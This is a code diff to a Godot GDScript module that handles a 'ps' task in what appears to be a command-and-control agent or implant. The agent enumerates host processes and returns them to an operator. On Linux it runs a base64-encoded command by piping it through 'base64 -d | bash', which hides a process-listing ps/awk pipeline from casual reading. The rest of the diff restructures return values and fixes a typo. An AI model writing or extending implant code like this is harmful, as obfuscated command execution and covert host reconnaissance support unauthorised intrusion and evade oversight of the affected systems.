@@ -11,25 +11,27 @@ func _on_tasking_ps(task):
 	if task.has("command") and task.get("command") == "ps":
 		var output = "not implemented xD"
 		var status = "error"
-		var processes = []
-		
+		var ret = {"processes": [], "exit_code": -1}
+
 		if OS.has_feature("X11"):
-			processes = get_linux_ps()
-			
+			ret = get_linux_ps()
+			output = "ps command executed with failure"
+
 		if OS.has_feature("Windows"):
-			processes = get_windows_ps()
+			ret = get_windows_ps()
 
 		if OS.has_feature("OSX"):
-			processes = get_osx_ps()
+			ret = get_osx_ps()
 
 		if OS.has_feature("iOS"):
-			processes = get_ios_ps()
+			ret = get_ios_ps()
 
 		if OS.has_feature("Android"):
-			processes = get_android_ps()
+			ret = get_android_ps()
 
-		if processes.size() > 0:
-			status = "successs"
+		if ret.get("processes").size() > 0 and ret.get("exit_code") == OK:
+			status = "success"
+			output = "ps command executed with success"
 
 		api.agent_response(
 			api.create_task_response(
@@ -40,7 +42,7 @@ func _on_tasking_ps(task):
 				[],
 				[],
 				[{
-					"processes": processes,
+					"processes": ret.get("processes"),
 					"task_id": task.get("id"),
 					"status": status,
 					"completed": true,
@@ -51,11 +53,10 @@ func _on_tasking_ps(task):
 func get_linux_ps():
 	var output = []
 
-	var exit_code = OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" | base64 -d | bash'], true, output, true)
-
-	print(exit_code)
-
-	return parse_json(output[0])
+	return {
+		"exit_code": OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" | base64 -d | bash'], true, output, true),
+		"processes": parse_json(output[0])
+	}
 
 func get_windows_ps():
 	return []
